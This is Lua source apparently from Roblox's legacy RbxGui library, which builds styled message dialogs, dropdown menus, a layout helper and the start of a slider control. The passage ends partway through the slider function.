local function RbxGui()
	local t = {}

	local function ScopedConnect(parentInstance, instance, event, signalFunc, syncFunc, removeFunc)
		local eventConnection = nil

		--Connection on parentInstance is scoped by parentInstance (when destroyed, it goes away)
		local tryConnect = function()
			if game:IsAncestorOf(parentInstance) then
				--Entering the world, make sure we are connected/synced
				if not eventConnection then
					eventConnection = instance[event]:connect(signalFunc)
					if syncFunc then syncFunc() end
				end
			else
				--Probably leaving the world, so disconnect for now
				if eventConnection then
					eventConnection:disconnect()
					if removeFunc then removeFunc() end
				end
			end
		end

		--Hook it up to ancestryChanged signal
		local connection = parentInstance.AncestryChanged:connect(tryConnect)

		--Now connect us if we're already in the world
		tryConnect()

		return connection
	end

	local function getLayerCollectorAncestor(instance)
		local localInstance = instance
		while localInstance and not localInstance:IsA("LayerCollector") do
			localInstance = localInstance.Parent
		end
		return localInstance
	end

	local function CreateButtons(frame, buttons, yPos, ySize)
		local buttonNum = 1
		local buttonObjs = {}
		for i, obj in ipairs(buttons) do 
			local button = Instance.new("TextButton")
			button.Name = "Button" .. buttonNum
			button.Font = Enum.Font.Arial
			button.FontSize = Enum.FontSize.Size18
			button.AutoButtonColor = true
			button.Modal = true
			if obj["Style"] then
				button.Style = obj.Style
			else
				button.Style = Enum.ButtonStyle.RobloxButton
			end
			if obj["ZIndex"] then
				button.ZIndex = obj.ZIndex
			end
			button.Text = obj.Text
			button.TextColor3 = Color3.new(1,1,1)
			button.MouseButton1Click:connect(obj.Function)
			button.Parent = frame
			buttonObjs[buttonNum] = button

			buttonNum = buttonNum + 1
		end
		local numButtons = buttonNum-1

		if numButtons == 1 then
			frame.Button1.Position = UDim2.new(0.35, 0, yPos.Scale, yPos.Offset)
			frame.Button1.Size = UDim2.new(.4,0,ySize.Scale, ySize.Offset)
		elseif numButtons == 2 then
			frame.Button1.Position = UDim2.new(0.1, 0, yPos.Scale, yPos.Offset)
			frame.Button1.Size = UDim2.new(.8/3,0, ySize.Scale, ySize.Offset)

			frame.Button2.Position = UDim2.new(0.55, 0, yPos.Scale, yPos.Offset)
			frame.Button2.Size = UDim2.new(.35,0, ySize.Scale, ySize.Offset)
		elseif numButtons >= 3 then
			local spacing = .1 / numButtons
			local buttonSize = .9 / numButtons

			buttonNum = 1
			while buttonNum <= numButtons do
				buttonObjs[buttonNum].Position = UDim2.new(spacing*buttonNum + (buttonNum-1) * buttonSize, 0, yPos.Scale, yPos.Offset)
				buttonObjs[buttonNum].Size = UDim2.new(buttonSize, 0, ySize.Scale, ySize.Offset)
				buttonNum = buttonNum + 1
			end
		end
	end

	local function setSliderPos(newAbsPosX,slider,sliderPosition,bar,steps)

		local newStep = steps - 1 --otherwise we really get one more step than we want
		local relativePosX = math.min(1, math.max(0, (newAbsPosX - bar.AbsolutePosition.X) / bar.AbsoluteSize.X ))
		local wholeNum, remainder = math.modf(relativePosX * newStep)
		if remainder > 0.5 then
			wholeNum = wholeNum + 1
		end
		relativePosX = wholeNum/newStep

		local result = math.ceil(relativePosX * newStep)
		if sliderPosition.Value ~= (result + 1) then --only update if we moved a step
			sliderPosition.Value = result + 1
			slider.Position = UDim2.new(relativePosX,-slider.AbsoluteSize.X/2,slider.Position.Y.Scale,slider.Position.Y.Offset)
		end

	end

	local function cancelSlide(areaSoak)
		areaSoak.Visible = false
	end

	t.CreateStyledMessageDialog = function(title, message, style, buttons)
		local frame = Instance.new("Frame")
		frame.Size = UDim2.new(0.5, 0, 0, 165)
		frame.Position = UDim2.new(0.25, 0, 0.5, -72.5)
		frame.Name = "MessageDialog"
		frame.Active = true
		frame.Style = Enum.FrameStyle.RobloxRound	

		local styleImage = Instance.new("ImageLabel")
		styleImage.Name = "StyleImage"
		styleImage.BackgroundTransparency = 1
		styleImage.Position = UDim2.new(0,5,0,15)
		if style == "error" or style == "Error" then
			styleImage.Size = UDim2.new(0, 71, 0, 71)
			styleImage.Image = "https://www.roblox.com/asset/?id=42565285"
		elseif style == "notify" or style == "Notify" then
			styleImage.Size = UDim2.new(0, 71, 0, 71)
			styleImage.Image = "https://www.roblox.com/asset/?id=42604978"
		elseif style == "confirm" or style == "Confirm" then
			styleImage.Size = UDim2.new(0, 74, 0, 76)
			styleImage.Image = "https://www.roblox.com/asset/?id=42557901"
		else
			return t.CreateMessageDialog(title,message,buttons)
		end
		styleImage.Parent = frame

		local titleLabel = Instance.new("TextLabel")
		titleLabel.Name = "Title"
		titleLabel.Text = title
		titleLabel.TextStrokeTransparency = 0
		titleLabel.BackgroundTransparency = 1
		titleLabel.TextColor3 = Color3.new(221/255,221/255,221/255)
		titleLabel.Position = UDim2.new(0, 80, 0, 0)
		titleLabel.Size = UDim2.new(1, -80, 0, 40)
		titleLabel.Font = Enum.Font.ArialBold
		titleLabel.FontSize = Enum.FontSize.Size36
		titleLabel.TextXAlignment = Enum.TextXAlignment.Center
		titleLabel.TextYAlignment = Enum.TextYAlignment.Center
		titleLabel.Parent = frame

		local messageLabel = Instance.new("TextLabel")
		messageLabel.Name = "Message"
		messageLabel.Text = message
		messageLabel.TextStrokeTransparency = 0
		messageLabel.TextColor3 = Color3.new(221/255,221/255,221/255)
		messageLabel.Position = UDim2.new(0.025, 80, 0, 45)
		messageLabel.Size = UDim2.new(0.95, -80, 0, 55)
		messageLabel.BackgroundTransparency = 1
		messageLabel.Font = Enum.Font.Arial
		messageLabel.FontSize = Enum.FontSize.Size18
		messageLabel.TextWrap = true
		messageLabel.TextXAlignment = Enum.TextXAlignment.Left
		messageLabel.TextYAlignment = Enum.TextYAlignment.Top
		messageLabel.Parent = frame

		CreateButtons(frame, buttons, UDim.new(0, 105), UDim.new(0, 40) )

		return frame
	end

	t.CreateMessageDialog = function(title, message, buttons)
		local frame = Instance.new("Frame")
		frame.Size = UDim2.new(0.5, 0, 0.5, 0)
		frame.Position = UDim2.new(0.25, 0, 0.25, 0)
		frame.Name = "MessageDialog"
		frame.Active = true
		frame.Style = Enum.FrameStyle.RobloxRound

		local titleLabel = Instance.new("TextLabel")
		titleLabel.Name = "Title"
		titleLabel.Text = title
		titleLabel.BackgroundTransparency = 1
		titleLabel.TextColor3 = Color3.new(221/255,221/255,221/255)
		titleLabel.Position = UDim2.new(0, 0, 0, 0)
		titleLabel.Size = UDim2.new(1, 0, 0.15, 0)
		titleLabel.Font = Enum.Font.ArialBold
		titleLabel.FontSize = Enum.FontSize.Size36
		titleLabel.TextXAlignment = Enum.TextXAlignment.Center
		titleLabel.TextYAlignment = Enum.TextYAlignment.Center
		titleLabel.Parent = frame

		local messageLabel = Instance.new("TextLabel")
		messageLabel.Name = "Message"
		messageLabel.Text = message
		messageLabel.TextColor3 = Color3.new(221/255,221/255,221/255)
		messageLabel.Position = UDim2.new(0.025, 0, 0.175, 0)
		messageLabel.Size = UDim2.new(0.95, 0, .55, 0)
		messageLabel.BackgroundTransparency = 1
		messageLabel.Font = Enum.Font.Arial
		messageLabel.FontSize = Enum.FontSize.Size18
		messageLabel.TextWrap = true
		messageLabel.TextXAlignment = Enum.TextXAlignment.Left
		messageLabel.TextYAlignment = Enum.TextYAlignment.Top
		messageLabel.Parent = frame

		CreateButtons(frame, buttons, UDim.new(0.8,0), UDim.new(0.15, 0))

		return frame
	end

	-- written by jmargh
	-- to be used for the new settings menu
	t.CreateScrollingDropDownMenu = function(onSelectedCallback, size, position, baseZ)
		local maxVisibleList = 6
		local baseZIndex = 0
		if type(baseZ) == 'number' then
			baseZIndex = baseZ
		end

		local dropDownMenu = {}
		local currentList = nil

		local updateFunc = nil
		local frame = Instance.new('Frame')
		frame.Name = "DropDownMenuFrame"
		frame.Size = size
		frame.Position = position
		frame.BackgroundTransparency = 1
		dropDownMenu.Frame = frame

		local currentSelectionName = Instance.new('TextButton')
		currentSelectionName.Name = "CurrentSelectionName"
		currentSelectionName.Size = UDim2.new(1, 0, 1, 0)
		currentSelectionName.BackgroundTransparency = 1
		currentSelectionName.Font = Enum.Font.SourceSansBold
		currentSelectionName.FontSize = Enum.FontSize.Size18
		currentSelectionName.TextXAlignment = Enum.TextXAlignment.Left
		currentSelectionName.TextYAlignment = Enum.TextYAlignment.Center
		currentSelectionName.TextColor3 = Color3.new(0.5, 0.5, 0.5)
		currentSelectionName.TextWrap = true
		currentSelectionName.ZIndex = baseZIndex
		currentSelectionName.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
		currentSelectionName.Text = "Choose One"
		currentSelectionName.Parent = frame
		dropDownMenu.CurrentSelectionButton = currentSelectionName

		local icon = Instance.new('ImageLabel')
		icon.Name = "DropDownIcon"
		icon.Size = UDim2.new(0, 16, 0, 12)
		icon.Position = UDim2.new(1, -17, 0.5, -6)
		icon.Image = 'rbxasset://textures/ui/dropdown_arrow.png'
		icon.BackgroundTransparency = 1
		icon.ZIndex = baseZIndex
		icon.Parent = currentSelectionName

		local listMenu = nil
		local scrollingBackground = nil
		local visibleCount = 0
		local isOpen = false

		local function onEntrySelected()
			icon.Rotation = 0
			scrollingBackground:TweenSize(UDim2.new(1, 0, 0, currentSelectionName.AbsoluteSize.y), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.15, true)
			--
			listMenu.ScrollBarThickness = 0
			listMenu:TweenSize(UDim2.new(1, -16, 0, 24), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.15, true, function()
				if not isOpen then
					listMenu.Visible = false
					scrollingBackground.Visible = false
				end
			end)
			isOpen = false
		end

		currentSelectionName.MouseButton1Click:connect(function()
			if not currentSelectionName.Active or #currentList == 0 then return end
			if isOpen then
				onEntrySelected()
				return
			end
			--
			isOpen = true
			icon.Rotation = 180
			if listMenu then listMenu.Visible = true end
			if scrollingBackground then scrollingBackground.Visible = true end
			--
			if scrollingBackground then
				scrollingBackground:TweenSize(UDim2.new(1, 0, 0, visibleCount * 24 + 8), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.15, true)
			end
			if listMenu then
				listMenu:TweenSize(UDim2.new(1, -16, 0, visibleCount * 24), Enum.EasingDirection.InOut, Enum.EasingStyle.Sine, 0.15, true, function()
					listMenu.ScrollBarThickness = 6
				end)
			end
		end)

		--[[ Public API ]]--
		dropDownMenu.IsOpen = function()
			return isOpen
		end

		dropDownMenu.Close = function()
			onEntrySelected()
		end

		dropDownMenu.Reset = function()
			isOpen = false
			icon.Rotation = 0
			listMenu.ScrollBarThickness = 0
			listMenu.Size = UDim2.new(1, -16, 0, 24)
			listMenu.Visible = false
			scrollingBackground.Visible = false
		end

		dropDownMenu.SetVisible = function(isVisible)
			if frame then
				frame.Visible = isVisible
			end
		end

		dropDownMenu.UpdateZIndex = function(newZIndexBase)
			currentSelectionName.ZIndex = newZIndexBase
			icon.ZIndex = newZIndexBase
			if scrollingBackground then scrollingBackground.ZIndex = newZIndexBase + 1 end
			if listMenu then
				listMenu.ZIndex = newZIndexBase + 2
				for _,child in pairs(listMenu:GetChildren()) do
					child.ZIndex = newZIndexBase + 4
				end
			end
		end

		dropDownMenu.SetActive = function(isActive)
			currentSelectionName.Active = isActive
		end

		dropDownMenu.SetSelectionText = function(text)
			currentSelectionName.Text = text
		end

		dropDownMenu.CreateList = function(list)
			currentSelectionName.Text = "Choose One"
			if listMenu then listMenu:Destroy() end
			if scrollingBackground then scrollingBackground:Destroy() end
			--
			currentList = list
			local length = #list
			visibleCount = math.min(maxVisibleList, length)
			local listMenuOffset = visibleCount * 24

			listMenu = Instance.new('ScrollingFrame')
			listMenu.Name = "ListMenu"
			listMenu.Size = UDim2.new(1, -16, 0, 24)
			listMenu.Position = UDim2.new(0, 12, 0, 32)
			listMenu.CanvasSize = UDim2.new(0, 0, 0, length * 24)
			listMenu.BackgroundTransparency = 1
			listMenu.BorderSizePixel = 0
			listMenu.ZIndex = baseZIndex + 2
			listMenu.Visible = false
			listMenu.Active = true
			listMenu.BottomImage = 'rbxasset://textures/ui/scroll-bottom.png'
			listMenu.MidImage = 'rbxasset://textures/ui/scroll-middle.png'
			listMenu.TopImage = 'rbxasset://textures/ui/scroll-top.png'
			listMenu.ScrollBarThickness = 0
			listMenu.Parent = frame

			scrollingBackground = Instance.new('TextButton')
			scrollingBackground.Name = "ScrollingBackground"
			scrollingBackground.Size = UDim2.new(1, 0, 0, currentSelectionName.AbsoluteSize.y)
			scrollingBackground.Position = UDim2.new(0, 0, 0, 28)
			scrollingBackground.BackgroundColor3 = Color3.new(1, 1, 1)
			scrollingBackground.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
			scrollingBackground.ZIndex = baseZIndex + 1
			scrollingBackground.Text = ""
			scrollingBackground.Visible = false
			scrollingBackground.AutoButtonColor = false
			scrollingBackground.Parent = frame

			for i = 1, length do
				local entry = list[i]
				local btn = Instance.new('TextButton')
				btn.Name = entry
				btn.Size = UDim2.new(1, 0, 0, 24)
				btn.Position = UDim2.new(0, 0, 0, (i - 1) * 24)
				btn.BackgroundTransparency = 0
				btn.BackgroundColor3 = Color3.new(1, 1, 1)
				btn.BorderSizePixel = 0
				btn.Font = Enum.Font.SourceSans
				btn.FontSize = Enum.FontSize.Size18
				btn.TextColor3 = Color3.new(0.5, 0.5, 0.5)
				btn.TextXAlignment = Enum.TextXAlignment.Left
				btn.TextYAlignment = Enum.TextYAlignment.Center
				btn.Text = entry
				btn.ZIndex = baseZIndex + 4
				btn.AutoButtonColor = false
				btn.Parent = listMenu

				btn.MouseButton1Click:connect(function()
					currentSelectionName.Text = btn.Text
					onEntrySelected()
					btn.Font = Enum.Font.SourceSans
					btn.TextColor3 = Color3.new(0.5, 0.5, 0.5)
					btn.BackgroundColor3 = Color3.new(1, 1, 1)
					onSelectedCallback(btn.Text)
				end)

				btn.MouseEnter:connect(function()
					btn.TextColor3 = Color3.new(1, 1, 1)
					btn.BackgroundColor3 = Color3.new(0.75, 0.75, 0.75)
				end)
				btn.MouseLeave:connect(function()
					btn.TextColor3 = Color3.new(0.5, 0.5, 0.5)
					btn.BackgroundColor3 = Color3.new(1, 1, 1)
				end)
			end
		end

		return dropDownMenu
	end

	t.CreateDropDownMenu = function(items, onSelect, forRoblox, whiteSkin, baseZ)
		local baseZIndex = 0
		if (type(baseZ) == "number") then
			baseZIndex = baseZ
		end
		local width = UDim.new(0, 100)
		local height = UDim.new(0, 32)

		local xPos = 0.055
		local frame = Instance.new("Frame")
		local textColor = Color3.new(1,1,1)
		if (whiteSkin) then
			textColor = Color3.new(0.5, 0.5, 0.5)
		end
		frame.Name = "DropDownMenu"
		frame.BackgroundTransparency = 1
		frame.Size = UDim2.new(width, height)

		local dropDownMenu = Instance.new("TextButton")
		dropDownMenu.Name = "DropDownMenuButton"
		dropDownMenu.TextWrap = true
		dropDownMenu.TextColor3 = textColor
		dropDownMenu.Text = "Choose One"
		dropDownMenu.Font = Enum.Font.ArialBold
		dropDownMenu.FontSize = Enum.FontSize.Size18
		dropDownMenu.TextXAlignment = Enum.TextXAlignment.Left
		dropDownMenu.TextYAlignment = Enum.TextYAlignment.Center
		dropDownMenu.BackgroundTransparency = 1
		dropDownMenu.AutoButtonColor = true
		if (whiteSkin) then
			dropDownMenu.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
		else
			dropDownMenu.Style = Enum.ButtonStyle.RobloxButton
		end
		dropDownMenu.Size = UDim2.new(1,0,1,0)
		dropDownMenu.Parent = frame
		dropDownMenu.ZIndex = 2 + baseZIndex

		local dropDownIcon = Instance.new("ImageLabel")
		dropDownIcon.Name = "Icon"
		dropDownIcon.Active = false
		if (whiteSkin) then
			dropDownIcon.Image = "rbxasset://textures/ui/dropdown_arrow.png"
			dropDownIcon.Size = UDim2.new(0,16,0,12)
			dropDownIcon.Position = UDim2.new(1,-17,0.5, -6)
		else
			dropDownIcon.Image = "https://www.roblox.com/asset/?id=45732894"
			dropDownIcon.Size = UDim2.new(0,11,0,6)
			dropDownIcon.Position = UDim2.new(1,-11,0.5, -2)
		end
		dropDownIcon.BackgroundTransparency = 1
		dropDownIcon.Parent = dropDownMenu
		dropDownIcon.ZIndex = 2 + baseZIndex

		local itemCount = #items
		local dropDownItemCount = #items
		local useScrollButtons = false
		if dropDownItemCount > 6 then
			useScrollButtons = true
			dropDownItemCount = 6
		end

		local droppedDownMenu = Instance.new("TextButton")
		droppedDownMenu.Name = "List"
		droppedDownMenu.Text = ""
		droppedDownMenu.BackgroundTransparency = 1
		--droppedDownMenu.AutoButtonColor = true
		if (whiteSkin) then
			droppedDownMenu.Style = Enum.ButtonStyle.RobloxRoundDropdownButton
		else
			droppedDownMenu.Style = Enum.ButtonStyle.RobloxButton
		end
		droppedDownMenu.Visible = false
		droppedDownMenu.Active = true	--Blocks clicks
		droppedDownMenu.Position = UDim2.new(0,0,0,0)
		droppedDownMenu.Size = UDim2.new(1,0, (1 + dropDownItemCount)*.8, 0)
		droppedDownMenu.Parent = frame
		droppedDownMenu.ZIndex = 2 + baseZIndex

		local choiceButton = Instance.new("TextButton")
		choiceButton.Name = "ChoiceButton"
		choiceButton.BackgroundTransparency = 1
		choiceButton.BorderSizePixel = 0
		choiceButton.Text = "ReplaceMe"
		choiceButton.TextColor3 = textColor
		choiceButton.TextXAlignment = Enum.TextXAlignment.Left
		choiceButton.TextYAlignment = Enum.TextYAlignment.Center
		choiceButton.BackgroundColor3 = Color3.new(1, 1, 1)
		choiceButton.Font = Enum.Font.Arial
		choiceButton.FontSize = Enum.FontSize.Size18
		if useScrollButtons then
			choiceButton.Size = UDim2.new(1,-13, .8/((dropDownItemCount + 1)*.8),0) 
		else
			choiceButton.Size = UDim2.new(1, 0, .8/((dropDownItemCount + 1)*.8),0) 
		end
		choiceButton.TextWrap = true
		choiceButton.ZIndex = 2 + baseZIndex

		local areaSoak = Instance.new("TextButton")
		areaSoak.Name = "AreaSoak"
		areaSoak.Text = ""
		areaSoak.BackgroundTransparency = 1
		areaSoak.Active = true
		areaSoak.Size = UDim2.new(1,0,1,0)
		areaSoak.Visible = false
		areaSoak.ZIndex = 3 + baseZIndex

		local dropDownSelected = false

		local scrollUpButton 
		local scrollDownButton
		local scrollMouseCount = 0

		local setZIndex = function(baseZIndex)
			droppedDownMenu.ZIndex = baseZIndex +1
			if scrollUpButton then
				scrollUpButton.ZIndex = baseZIndex + 3
			end
			if scrollDownButton then
				scrollDownButton.ZIndex = baseZIndex + 3
			end

			local children = droppedDownMenu:GetChildren()
			if children then
				for i, child in ipairs(children) do
					if child.Name == "ChoiceButton" then
						child.ZIndex = baseZIndex + 2
					elseif child.Name == "ClickCaptureButton" then
						child.ZIndex = baseZIndex
					end
				end
			end
		end

		local scrollBarPosition = 1
		local updateScroll = function()
			if scrollUpButton then
				scrollUpButton.Active = scrollBarPosition > 1 
			end
			if scrollDownButton then
				scrollDownButton.Active = scrollBarPosition + dropDownItemCount <= itemCount 
			end

			local children = droppedDownMenu:GetChildren()
			if not children then return end

			local childNum = 1			
			for i, obj in ipairs(children) do
				if obj.Name == "ChoiceButton" then
					if childNum < scrollBarPosition or childNum >= scrollBarPosition + dropDownItemCount then
						obj.Visible = false
					else
						obj.Position = UDim2.new(0,0,((childNum-scrollBarPosition+1)*.8)/((dropDownItemCount+1)*.8),0)
						obj.Visible = true
					end
					obj.TextColor3 = textColor
					obj.BackgroundTransparency = 1

					childNum = childNum + 1
				end
			end
		end
		local toggleVisibility = function()
			dropDownSelected = not dropDownSelected

			areaSoak.Visible = not areaSoak.Visible
			dropDownMenu.Visible = not dropDownSelected
			droppedDownMenu.Visible = dropDownSelected
			if dropDownSelected then
				setZIndex(4 + baseZIndex)
			else
				setZIndex(2 + baseZIndex)
			end
			if useScrollButtons then
				updateScroll()
			end
		end
		droppedDownMenu.MouseButton1Click:connect(toggleVisibility)

		local updateSelection = function(text)
			local foundItem = false
			local children = droppedDownMenu:GetChildren()
			local childNum = 1
			if children then
				for i, obj in ipairs(children) do
					if obj.Name == "ChoiceButton" then
						if obj.Text == text then
							obj.Font = Enum.Font.ArialBold
							foundItem = true			
							scrollBarPosition = childNum						
							if (whiteSkin) then
								obj.TextColor3 = Color3.new(90/255,142/255,233/255)
							end
						else
							obj.Font = Enum.Font.Arial
							if (whiteSkin) then
								obj.TextColor3 = textColor
							end
						end
						childNum = childNum + 1
					end
				end
			end
			if not text then
				dropDownMenu.Text = "Choose One"
				scrollBarPosition = 1
			else
				if not foundItem then
					error("Invalid Selection Update -- " .. text)
				end

				if scrollBarPosition + dropDownItemCount > itemCount + 1 then
					scrollBarPosition = itemCount - dropDownItemCount + 1
				end

				dropDownMenu.Text = text
			end
		end

		local function scrollDown()
			if scrollBarPosition + dropDownItemCount <= itemCount then
				scrollBarPosition = scrollBarPosition + 1
				updateScroll()
				return true
			end
			return false
		end
		local function scrollUp()
			if scrollBarPosition > 1 then
				scrollBarPosition = scrollBarPosition - 1
				updateScroll()
				return true
			end
			return false
		end

		if useScrollButtons then
			--Make some scroll buttons
			scrollUpButton = Instance.new("ImageButton")
			scrollUpButton.Name = "ScrollUpButton"
			scrollUpButton.BackgroundTransparency = 1
			scrollUpButton.Image = "rbxasset://textures/ui/scrollbuttonUp.png"
			scrollUpButton.Size = UDim2.new(0,17,0,17) 
			scrollUpButton.Position = UDim2.new(1,-11,(1*.8)/((dropDownItemCount+1)*.8),0)
			scrollUpButton.MouseButton1Click:connect(
				function()
					scrollMouseCount = scrollMouseCount + 1
				end)
			scrollUpButton.MouseLeave:connect(
				function()
					scrollMouseCount = scrollMouseCount + 1
				end)
			scrollUpButton.MouseButton1Down:connect(
				function()
					scrollMouseCount = scrollMouseCount + 1

					scrollUp()
					local val = scrollMouseCount
					wait(0.5)
					while val == scrollMouseCount do
						if scrollUp() == false then
							break
						end
						wait(0.1)
					end				
				end)

			scrollUpButton.Parent = droppedDownMenu

			scrollDownButton = Instance.new("ImageButton")
			scrollDownButton.Name = "ScrollDownButton"
			scrollDownButton.BackgroundTransparency = 1
			scrollDownButton.Image = "rbxasset://textures/ui/scrollbuttonDown.png"
			scrollDownButton.Size = UDim2.new(0,17,0,17) 
			scrollDownButton.Position = UDim2.new(1,-11,1,-11)
			scrollDownButton.Parent = droppedDownMenu
			scrollDownButton.MouseButton1Click:connect(
				function()
					scrollMouseCount = scrollMouseCount + 1
				end)
			scrollDownButton.MouseLeave:connect(
				function()
					scrollMouseCount = scrollMouseCount + 1
				end)
			scrollDownButton.MouseButton1Down:connect(
				function()
					scrollMouseCount = scrollMouseCount + 1

					scrollDown()
					local val = scrollMouseCount
					wait(0.5)
					while val == scrollMouseCount do
						if scrollDown() == false then
							break
						end
						wait(0.1)
					end				
				end)	

			local scrollbar = Instance.new("ImageLabel")
			scrollbar.Name = "ScrollBar"
			scrollbar.Image = "rbxasset://textures/ui/scrollbar.png"
			scrollbar.BackgroundTransparency = 1
			scrollbar.Size = UDim2.new(0, 18, (dropDownItemCount*.8)/((dropDownItemCount+1)*.8), -(17) - 11 - 4)
			scrollbar.Position = UDim2.new(1,-11,(1*.8)/((dropDownItemCount+1)*.8),17+2)
			scrollbar.Parent = droppedDownMenu
		end

		for i,item in ipairs(items) do
			-- needed to maintain local scope for items in event listeners below
			local button = choiceButton:clone()
			if forRoblox then
				button.RobloxLocked = true
			end		
			button.Text = item
			button.Parent = droppedDownMenu
			if (whiteSkin) then
				button.TextColor3 = textColor
			end

			button.MouseButton1Click:connect(function()
				--Remove Highlight
				if (not whiteSkin) then
					button.TextColor3 = Color3.new(1,1,1)
				end
				button.BackgroundTransparency = 1

				updateSelection(item)
				onSelect(item)

				toggleVisibility()
			end)
			button.MouseEnter:connect(function()
				--Add Highlight	
				if (not whiteSkin) then
					button.TextColor3 = Color3.new(0,0,0)
				end
				button.BackgroundTransparency = 0
			end)

			button.MouseLeave:connect(function()
				--Remove Highlight
				if (not whiteSkin) then
					button.TextColor3 = Color3.new(1,1,1)
				end
				button.BackgroundTransparency = 1
			end)
		end

		--This does the initial layout of the buttons	
		updateScroll()

		frame.AncestryChanged:connect(function(child,parent)
			if parent == nil then
				areaSoak.Parent = nil
			else
				areaSoak.Parent = getLayerCollectorAncestor(frame)
			end
		end)

		dropDownMenu.MouseButton1Click:connect(toggleVisibility)
		areaSoak.MouseButton1Click:connect(toggleVisibility)
		return frame, updateSelection
	end

	t.CreatePropertyDropDownMenu = function(instance, property, enum)

		local items = enum:GetEnumItems()
		local names = {}
		local nameToItem = {}
		for i,obj in ipairs(items) do
			names[i] = obj.Name
			nameToItem[obj.Name] = obj
		end

		local frame
		local updateSelection
		frame, updateSelection = t.CreateDropDownMenu(names, function(text) instance[property] = nameToItem[text] end)

		ScopedConnect(frame, instance, "Changed", 
			function(prop)
				if prop == property then
					updateSelection(instance[property].Name)
				end
			end,
			function()
				updateSelection(instance[property].Name)
			end)

		return frame
	end

	t.GetFontHeight = function(font, fontSize)
		if font == nil or fontSize == nil then
			error("Font and FontSize must be non-nil")
		end

		local fontSizeInt = tonumber(fontSize.Name:match("%d+")) -- Clever hack to extract the size from the enum itself.

		if font == Enum.Font.Legacy then -- Legacy has a 50% bigger size.
			return math.ceil(fontSizeInt*1.5)
		else -- Size is literally just the fontSizeInt
			return fontSizeInt
		end
	end

	local function layoutGuiObjectsHelper(frame, guiObjects, settingsTable)
		local totalPixels = frame.AbsoluteSize.Y
		local pixelsRemaining = frame.AbsoluteSize.Y
		for i, child in ipairs(guiObjects) do
			if child:IsA("TextLabel") or child:IsA("TextButton") then
				local isLabel = child:IsA("TextLabel")
				if isLabel then
					pixelsRemaining = pixelsRemaining - settingsTable["TextLabelPositionPadY"]
				else
					pixelsRemaining = pixelsRemaining - settingsTable["TextButtonPositionPadY"]
				end
				child.Position = UDim2.new(child.Position.X.Scale, child.Position.X.Offset, 0, totalPixels - pixelsRemaining)
				child.Size = UDim2.new(child.Size.X.Scale, child.Size.X.Offset, 0, pixelsRemaining)

				if child.TextFits and child.TextBounds.Y < pixelsRemaining then
					child.Visible = true
					if isLabel then
						child.Size = UDim2.new(child.Size.X.Scale, child.Size.X.Offset, 0, child.TextBounds.Y + settingsTable["TextLabelSizePadY"])
					else 
						child.Size = UDim2.new(child.Size.X.Scale, child.Size.X.Offset, 0, child.TextBounds.Y + settingsTable["TextButtonSizePadY"])
					end

					while not child.TextFits do
						child.Size = UDim2.new(child.Size.X.Scale, child.Size.X.Offset, 0, child.AbsoluteSize.Y + 1)
					end
					pixelsRemaining = pixelsRemaining - child.AbsoluteSize.Y		

					if isLabel then
						pixelsRemaining = pixelsRemaining - settingsTable["TextLabelPositionPadY"]
					else
						pixelsRemaining = pixelsRemaining - settingsTable["TextButtonPositionPadY"]
					end
				else
					child.Visible = false
					pixelsRemaining = -1
				end			

			else
				--GuiObject
				child.Position = UDim2.new(child.Position.X.Scale, child.Position.X.Offset, 0, totalPixels - pixelsRemaining)
				pixelsRemaining = pixelsRemaining - child.AbsoluteSize.Y
				child.Visible = (pixelsRemaining >= 0)
			end
		end
	end

	t.LayoutGuiObjects = function(frame, guiObjects, settingsTable)
		if not frame:IsA("GuiObject") then
			error("Frame must be a GuiObject")
		end
		for i, child in ipairs(guiObjects) do
			if not child:IsA("GuiObject") then
				error("All elements that are layed out must be of type GuiObject")
			end
		end

		if not settingsTable then
			settingsTable = {}
		end

		if not settingsTable["TextLabelSizePadY"] then
			settingsTable["TextLabelSizePadY"] = 0
		end
		if not settingsTable["TextLabelPositionPadY"] then
			settingsTable["TextLabelPositionPadY"] = 0
		end
		if not settingsTable["TextButtonSizePadY"] then
			settingsTable["TextButtonSizePadY"] = 12
		end
		if not settingsTable["TextButtonPositionPadY"] then
			settingsTable["TextButtonPositionPadY"] = 2
		end

		--Wrapper frame takes care of styled objects
		local wrapperFrame = Instance.new("Frame")
		wrapperFrame.Name = "WrapperFrame"
		wrapperFrame.BackgroundTransparency = 1
		wrapperFrame.Size = UDim2.new(1,0,1,0)
		wrapperFrame.Parent = frame

		for i, child in ipairs(guiObjects) do
			child.Parent = wrapperFrame
		end

		local recalculate = function()
			wait()
			layoutGuiObjectsHelper(wrapperFrame, guiObjects, settingsTable)
		end

		frame.Changed:connect(
			function(prop)
				if prop == "AbsoluteSize" then
					--Wait a heartbeat for it to sync in
					recalculate(nil)
				end
			end)
		frame.AncestryChanged:connect(recalculate)

		layoutGuiObjectsHelper(wrapperFrame, guiObjects, settingsTable)
	end


	t.CreateSlider = function(steps,width,position)
		local sliderGui = Instance.new("Frame")
		sliderGui.Size = UDim2.new(1,0,1,0)
		sliderGui.BackgroundTransparency = 1
		sliderGui.Name = "SliderGui"

		local sliderSteps = Instance.new("IntValue")
		sliderSteps.Name = "SliderSteps"
		sliderSteps.Value = steps
		sliderSteps.Parent = sliderGui

		local areaSoak = Instance.new("TextButton")
		areaSoak.Name = "AreaSoak"
		areaSoak.Text = ""
		areaSoak.BackgroundTransparency = 1
		areaSoak.Active = false
		areaSoak.Size = UDim2.new(1,0,1,0)
		areaSoak.Visible = false
		areaSoak.ZIndex = 4

		sliderGui.AncestryChanged:connect(function(child,parent)
			if parent == nil then
				areaSoak.Parent = nil
			else
				areaSoak.Parent = getLayerCollectorAncestor(sliderGui)
			end
		end)

		local sliderPosition = Instance.new("IntValue")
		sliderPosition.Name = "SliderPosition"
		sliderPosition.Value = 0
		sliderPosition.Parent = sliderGui

		local id = math.random(1,100)

		local bar = Instance.new("TextButton")
		bar.Text = ""
		bar.AutoButtonColor = false
		bar.Name = "Bar"
		bar.BackgroundColor3 = Color3.new(0,0,0)
		if type(width) == "number" then
			bar.Size = UDim2.new(0,width,0,5)
		else
			bar.Size = UDim2.new(0,200,0,5)
		end
		bar.BorderColor3 = Color3.new(95/255,95/255,95/255)
		bar.ZIndex = 2
		bar.Parent = sliderGui

		if position["X"] and position["X"]["Scale"] and position["X"]["Offset"] and position["Y"] and position["Y"]["Scale"] and position["Y"]["Offset"] then
			bar.Position = position
		end
